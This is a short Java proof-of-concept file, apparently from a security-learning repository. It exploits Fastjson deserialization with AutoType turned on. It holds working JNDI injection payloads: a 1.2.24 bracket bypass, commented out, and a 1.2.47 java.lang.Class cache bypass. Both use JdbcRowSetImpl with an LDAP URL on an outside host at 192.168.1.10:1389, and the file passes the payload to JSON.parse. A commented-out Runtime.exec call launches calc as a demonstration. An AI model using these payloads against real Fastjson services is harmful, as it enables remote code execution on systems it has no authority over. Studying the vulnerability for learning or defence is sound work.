package com.yglearnsec.javasec;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class fastjson_24rce {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        System.out.print("hello world!");
        //String payload1_24 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://192.168.1.10:1389/vwstze\",\"autoCommit\":false}";
        String payload47 = "{\"v47\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.10:1389/vwstze\",\"autoCommit\":true}}";

        System.out.println(payload47);
        System.out.println("\n反序列化：");
        System.out.println(JSON.parse(payload47));





//        String command = "cmd /c calc";
//        try {
//            Process process = Runtime.getRuntime().exec(command,null);
//            process.getOutputStream().close();
//            int exitVlaue = process.waitFor();
//            System.out.println("return:"+exitVlaue);
//        } catch (Exception e){
//            e.printStackTrace();
//        }


    }
}
